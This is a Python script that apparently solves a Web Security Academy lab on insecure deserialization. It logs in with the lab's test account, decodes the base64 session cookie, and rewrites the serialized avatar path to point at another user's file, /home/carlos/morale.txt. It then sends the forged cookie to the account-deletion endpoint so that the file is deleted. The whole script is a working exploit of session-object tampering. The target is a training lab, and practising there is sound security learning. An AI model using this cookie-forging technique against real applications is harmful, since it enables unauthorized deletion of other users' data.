import requests
import base64

url = "https://ac641fa91e969135c01b12de002d00a7.web-security-academy.net"


def decode_bs4(t):

	base64_bytes = t.encode("ascii")
	sample_string_bytes = base64.b64decode(base64_bytes)
	sample_string = sample_string_bytes.decode("ascii")
	  
	return sample_string

def encode_bs4(e):

	sample_string_bytes = e.encode("ascii")  
	base64_bytes = base64.b64encode(sample_string_bytes)
	base64_string = base64_bytes.decode("ascii")

	return base64_string

def slove(url):

	s = requests.session()

	data = {"username": "wiener", "password": "peter"}
	r1 = s.post(url+ "/login", data=data)
	
	cookie = s.cookies.get_dict()
	
	d = decode_bs4(cookie['session'].replace(f"%3d", "=")).replace("users/wiener/avatar", "/home/carlos/morale.txt").replace('19','23')
	payload = encode_bs4(d)

	exploit = s.post(url + "/my-account/delete", cookies={'session': payload})

	print(exploit)

slove(url)